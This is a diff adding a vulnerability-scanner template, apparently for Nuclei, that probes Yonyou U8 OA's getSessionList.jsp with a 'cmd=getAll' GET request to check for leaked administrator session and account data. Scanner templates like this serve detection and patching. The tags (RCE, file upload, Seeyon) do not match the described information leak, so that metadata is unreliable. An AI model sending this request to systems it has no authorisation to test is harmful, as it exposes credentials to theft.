@@ -1,0 +1,35 @@
+id: 用友 U8 OA getSessionList.jsp文件
+time: "2022-02-04"
+
+info:
+  severity: critical
+  description: 用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息
+  reference:
+    - https://www.hackjie.com/docs/3294.html
+  remediation: Apply the appropriate patch.
+  tags: zhiyuan,rce,fileupload,seeyon,intrusive
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - GET
+    path:
+      - "{{BaseURL}}/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "1"
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: status
+        status:
+          - 200
+
+# Enhanced by mp on 2022/02/04
